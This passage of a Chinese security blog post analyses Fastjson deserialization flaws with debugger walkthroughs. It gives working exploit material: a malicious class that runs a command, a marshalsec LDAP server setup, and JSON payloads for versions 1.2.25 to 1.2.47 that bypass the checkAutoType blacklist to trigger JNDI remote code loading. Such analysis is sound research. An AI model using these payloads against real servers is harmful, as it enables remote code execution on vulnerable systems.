+<figure data-type="image" tabindex="16"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174045347.png" alt="image-20220411174045347" loading="lazy"></figure>
+<p>这里的getDataSourceName的值是我们在前面setDataSourceName()方法中设置的值，lookup里的内容可控，所以这里可能造成JNDI注入漏洞</p>
+<p>调用栈如下</p>
+<pre><code>connect:624, JdbcRowSetImpl (com.sun.rowset)
+setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)
+invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+invoke:62, NativeMethodAccessorImpl (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:497, Method (java.lang.reflect)
+setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
+parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
+parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
+deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
+parseRest:922, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
+deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)
+deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
+parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
+parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
+parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
+parse:137, JSON (com.alibaba.fastjson)
+parse:128, JSON (com.alibaba.fastjson)
+main:9, Test (RMI)
+</code></pre>
+<h3 id="漏洞利用">漏洞利用</h3>
+<p>还需要一个恶意类，badClassName.java</p>
+<pre><code class="language-java">import java.io.IOException;
+
+public class badClassName {
+    public badClassName() {
+    }
+    static {
+        try {
+
+            Runtime.getRuntime().exec(&quot;calc.exe&quot;);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+}
+</code></pre>
+<p>然后把我们的badClassName.class放到一个文件夹中，开启HTTP服务</p>
+<pre><code>python3 -m http.server 8000
+</code></pre>
+<p>并且使用marshalsec开启JNDI服务</p>
+<pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#badClassName 1389
+</code></pre>
+<p>客户端代码Client.java如下</p>
+<pre><code class="language-java">package RMI;
+
+import com.alibaba.fastjson.JSON;
+
+public class Test {
+    public static void main(String[] args) {
+        String PoC = &quot;{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/badClassName\&quot;, \&quot;autoCommit\&quot;:true}&quot;;
+        JSON.parse(PoC);
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="17"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174049736.png" alt="image-20220411174049736" loading="lazy"></figure>
+<h1 id="fastjson-1225-1247反序列化">Fastjson 1.2.25-1.2.47反序列化</h1>
+<p>在FastJson1.2.25以及之后的版本中，fastjson为了防止autoType这一机制带来的安全隐患，增加了一层名为checkAutoType的检测机制。他使用了checkAutoType来修复1.2.22-1.2.24中的漏洞，其中有个autoTypeSupport默认为False。当autoTypeSupport为False时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错。当autoTypeSupport为True时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤。对于开启或者不开启，都有相应的绕过方法。</p>
+<h2 id="1225-1241绕过方法">1.2.25-1.2.41绕过方法</h2>
+<pre><code class="language-java">import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.ParserConfig;
+
+
+public class JSONTest {
+    public static void main(String[] args) {
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        String payload=&quot;{\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Calc\&quot;, \&quot;autoCommit\&quot;:true}&quot;;
+        JSON.parse(payload);
+    }
+}
+</code></pre>
+<p>可以看到，和最普通的fastjson相比，他在@type字段的值的最前面加了一个L，就可以绕过黑名单，我们这里调试分析一下，我们直接把断点打到ParserConfig的checkAutoType方法<img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220427135754134.png" alt="image-20220427135754134" loading="lazy"></p>
+<p>他把我们传进去的@type字段的值去判断是否以acceptList和denyList里的元素开始，这里就是一个白名单和黑名单，判断需要反序列化的对象是否是黑名单的包下的对象或者是黑名单中的对象，如果是就抛出异常</p>
+<figure data-type="image" tabindex="18"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220427140140218.png" alt="image-20220427140140218" loading="lazy"></figure>
+<p>由于上图根据我们提供的类名找不到对应的类，继续往下运行</p>
+<figure data-type="image" tabindex="19"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220427140223431.png" alt="image-20220427140223431" loading="lazy"></figure>
+<p>这里调用了TypeUtils.loadClass，跟进看看</p>
+<figure data-type="image" tabindex="20"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220427135557034.png" alt="image-20220427135557034" loading="lazy"></figure>
+<p>判断了ClassName是否以L开头并且以;结尾，并且截取第一个开始到结尾的className作为新的类名，然后调用loadClass去加载类。这里就实现了绕过</p>
+<h2 id="1225-1242绕过方法">1.2.25-1.2.42绕过方法</h2>
+<p>在fastjson1.2.42中，删除了之前的acceptList和denyList，使用了acceptHashCodes和denyHashCodes</p>
+<figure data-type="image" tabindex="21"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220427141541266.png" alt="image-20220427141541266" loading="lazy"></figure>
+<pre><code class="language-java">import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.ParserConfig;
+
+
+public class JSONTest {
+    public static void main(String[] args) {
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        String payload=&quot;{\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Calc\&quot;, \&quot;autoCommit\&quot;:true}&quot;;
+        JSON.parse(payload);
+    }
+}
+</code></pre>
+<p>这种绕过方法是使用两次L和;的组合，原因是他在TypeUtils的的loadClass如果发现className是L开头;结尾的，他会去一直调用loadClass直到没有L和;为止，这里就不多演示了</p>
+<figure data-type="image" tabindex="22"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220427141029862.png" alt="image-20220427141029862" loading="lazy"></figure>
+<h2 id="1225-1243绕过方法">1.2.25-1.2.43绕过方法</h2>
+<p>再试之前的那个payload会抛出异常，所以我们需要换一个，是否记得之前在判断L开头和;结尾上面还有一个判断是否以[开头</p>
+<figure data-type="image" tabindex="23"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220427135557034.png" alt="image-20220427135557034" loading="lazy"></figure>
+<p>那我们现在直接在最基础的payload上加一个[，报错如下</p>
+<pre><code>exepct '[', but ,, pos 42, json : {&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1389/Calc&quot;, &quot;autoCommit&quot;:true}
+</code></pre>
+<p>希望在第42列加个[,那我们继续，继续报错</p>
+<pre><code>syntax error, expect {, actual string, pos 43, fastjson-version 1.2.43
+</code></pre>
+<p>继续在第43列加个{,成功弹出计算器<img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220427143637627.png" alt="image-20220427143637627" loading="lazy"></p>
+<p>直接把断点打在TypeUtils的loadClass方法，此时是第一次进入该方法，但是可以看到当前的className只在最开始有一个[，说明在之前就经过处理</p>
+<figure data-type="image" tabindex="24"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220427143952038.png" alt="image-20220427143952038" loading="lazy"></figure>
+<p>逐步调试发现，貌似是在lexer.scanSymbol进行处理</p>
+<figure data-type="image" tabindex="25"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220427150443466.png" alt="image-20220427150443466" loading="lazy"></figure>
+<p>最后把在这个typeName传入到checkAutoType方法中。</p>
+<figure data-type="image" tabindex="26"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220427150507837.png" alt="image-20220427150507837" loading="lazy"></figure>
+<h2 id="1225-1245绕过方法">1.2.25-1.2.45绕过方法</h2>
+<p>检测了[，如果检测到开头是[，就抛出异常</p>
+<figure data-type="image" tabindex="27"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220427152420727.png" alt="image-20220427152420727" loading="lazy"></figure>
+<p>需要有mybatis&lt;3.5.0，</p>
+<pre><code class="language-java">import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.ParserConfig;
+
+
+public class JSONTest {
+    public static void main(String[] args) {
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        String payload=&quot;{\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:{\&quot;data_source\&quot;:\&quot;ldap://localhost:1389/Calc\&quot;}}&quot;;
+        JSON.parse(payload);
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="28"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220427151551132.png" alt="image-20220427151551132" loading="lazy"></figure>
+<h2 id="1225-1247通杀无需autotypesupport">1.2.25-1.2.47通杀(无需AutoTypeSupport)</h2>
+<p>通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测</p>
+<p>这里有两个版本段：</p>
+<ul>
+<li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport不能利用</li>
+<li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用</li>
+</ul>
+<pre><code class="language-java">import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.ParserConfig;
+
+
+public class JSONTest {
+    public static void main(String[] args) {
+        String payload=&quot;{\n&quot; +
+                &quot;    \&quot;a\&quot;:{\n&quot; +
+                &quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot; +
+                &quot;        \&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot; +
+                &quot;    },\n&quot; +
+                &quot;    \&quot;b\&quot;:{\n&quot; +
+                &quot;        \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot; +
+                &quot;        \&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Calc\&quot;,\n&quot; +
+                &quot;        \&quot;autoCommit\&quot;:true\n&quot; +
+                &quot;    }\n&quot; +
+                &quot;}&quot;;
+        JSON.parse(payload);
+    }
+}
+</code></pre>
+<p>未开启AutoTypeSupport，所以就不会进入黑白名单判断的逻辑.因为type的值是<code>java.lang.Class</code>，所以可以直接findClass，最后返回clazz，然后进入MiscCodec#deserialze</p>
+<figure data-type="image" tabindex="29"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220427154918017.png" alt="image-20220427154918017" loading="lazy"></figure>
+<p>这里使用了TypeUtils.loadClass函数加载了JdbcRowSetlmpl对象，会将其缓存在map中</p>
+<figure data-type="image" tabindex="30"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220427154810348.png" alt="image-20220427154810348" loading="lazy"></figure>
+<figure data-type="image" tabindex="31"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220427155049626.png" alt="image-20220427155049626" loading="lazy"></figure>
+<h1 id="参考文章">参考文章</h1>
+<p>https://xz.aliyun.com/t/9052#toc-13</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#fastjson%E7%AE%80%E4%BB%8B">Fastjson简介</a></li>
+<li><a href="#fastjson-1222-1224%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0">Fastjson 1.2.22-1.2.24反序列化复现</a></li>
+<li><a href="#fastjson-1222-1224%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90">Fastjson 1.2.22-1.2.24反序列化原理分析</a>
+<ul>
+<li><a href="#templatesimpl%E5%88%A9%E7%94%A8%E9%93%BE">TemplatesImpl利用链</a>
+<ul>
+<li><a href="#%E5%9D%91%E4%B8%80">坑一</a></li>
+<li><a href="#%E5%9D%91%E4%BA%8C">坑二:</a></li>
+</ul>
+</li>
+<li><a href="#jndi%E4%B9%8Bjdbcrowsetimpl">JNDI之JdbcRowSetImpl</a>
+<ul>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">漏洞利用</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#fastjson-1225-1247%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">Fastjson 1.2.25-1.2.47反序列化</a>
+<ul>
+<li><a href="#1225-1241%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95">1.2.25-1.2.41绕过方法</a></li>
+<li><a href="#1225-1242%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95">1.2.25-1.2.42绕过方法</a></li>
+<li><a href="#1225-1243%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95">1.2.25-1.2.43绕过方法</a></li>
+<li><a href="#1225-1245%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95">1.2.25-1.2.45绕过方法</a></li>
+<li><a href="#1225-1247%E9%80%9A%E6%9D%80%E6%97%A0%E9%9C%80autotypesupport">1.2.25-1.2.47通杀(无需AutoTypeSupport)</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0">参考文章</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ch0x01e.github.io/post/ctfjian-dan-de-ezgadget/">
+              <h3 class="post-title">
+                CTF:简单的ezgadget
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ch0x01e.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
